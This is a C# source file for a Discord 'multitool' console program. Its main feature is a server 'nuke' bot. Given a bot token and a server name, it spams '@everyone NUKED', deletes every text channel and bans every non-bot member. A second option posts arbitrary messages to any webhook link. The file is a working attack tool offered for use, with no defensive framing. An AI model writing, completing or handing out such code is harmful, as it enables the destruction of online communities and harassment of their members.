using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.WebSocket;

namespace ArchsMultiTool
{
    internal class Program
    {
        private readonly DiscordSocketClient client;

        public Program()
        {
            this.client = new DiscordSocketClient();
            this.client.MessageReceived += MessageHandler;
        }

        public async Task StartBotAsync(string token)
        {
            this.client.Log += LogFuncAsync;
            await this.client.LoginAsync(TokenType.Bot, token);
            await this.client.StartAsync();

            Console.WriteLine("Send a message in the server to nuke");
            //string choice = Console.ReadLine();
            await Task.Delay(-1);
        }

        private Task LogFuncAsync(LogMessage message)
        {
            Console.WriteLine(message.ToString());
            return Task.CompletedTask;
        }

        private async Task MessageHandler(SocketMessage message)
        {
            if (message.Author.IsBot) return;

            Console.WriteLine("Available guilds:");
            foreach (var guild in client.Guilds)
            {
                Console.WriteLine(guild.Name);
            }

            Console.WriteLine("\nType the name of the guild to nuke:");
            string chosenGuildName = Console.ReadLine();
            var chosenGuild = client.Guilds.FirstOrDefault(g => g.Name.Equals(chosenGuildName, StringComparison.OrdinalIgnoreCase));

            if (chosenGuild != null)
            {
                foreach (var channel in chosenGuild.Channels)
                {
                    if (channel is SocketTextChannel textChannel)
                    {
                        Thread.Sleep(2500);
                        await ReplyAsync(message, "@everyone NUKED \n HELPED BY DSC MULTITOOL V1");
                        await textChannel.DeleteAsync();
                        Console.WriteLine($"Deleted channel: {textChannel.Name}");
                    }
                }

                foreach (var user in chosenGuild.Users)
                {
                    if (!user.IsBot)
                    {
                        await chosenGuild.AddBanAsync(user);
                        Console.WriteLine($"Banned user: {user.Username}");
                    }
                }

                Console.WriteLine("Nuke complete");
            }
            else
            {
                Console.WriteLine("Guild not found.");
            }
        }

        private async Task ReplyAsync(SocketMessage message, string response)
        {
            await message.Channel.SendMessageAsync(response);
        }

        static async Task Main(string[] args)
        {

            while (true)
            {

                Console.Clear();
                Console.ForegroundColor = ConsoleColor.White;
                Console.WriteLine("DSC MultiTool | v1.0");
                Console.WriteLine("Current commands: \n 1) Nuke server (token needed) \n 2) Send webhook msg \n exit) Exit MultiTool");

                string commandChoice = Console.ReadLine();
                if (commandChoice == "1")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Enter your bot token: ");
                    string token = Console.ReadLine();

                    var program = new Program();
                    await program.StartBotAsync(token);
                }
                else if (commandChoice == "2")
                {
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("Enter webhook link: ");
                    string link = Console.ReadLine();
                    Console.WriteLine("Enter webhook content/message: ");
                    string messageContent2 = Console.ReadLine();
                    string json = $"{{\"content\":\"{messageContent2}\"}}";

                    using (HttpClient client = new HttpClient())
                    using (var content = new StringContent(json, Encoding.UTF8, "application/json"))
                    {
                        await client.PostAsync(link, content);
                    }

                    Console.WriteLine("Message sent");
                }
                else if (commandChoice == "exit")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Goodbye!");
                    Thread.Sleep(1000);
                    Environment.Exit(1);
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Not implemented");
                    await Task.Delay(1000);
                }
            }
        }
    }
}
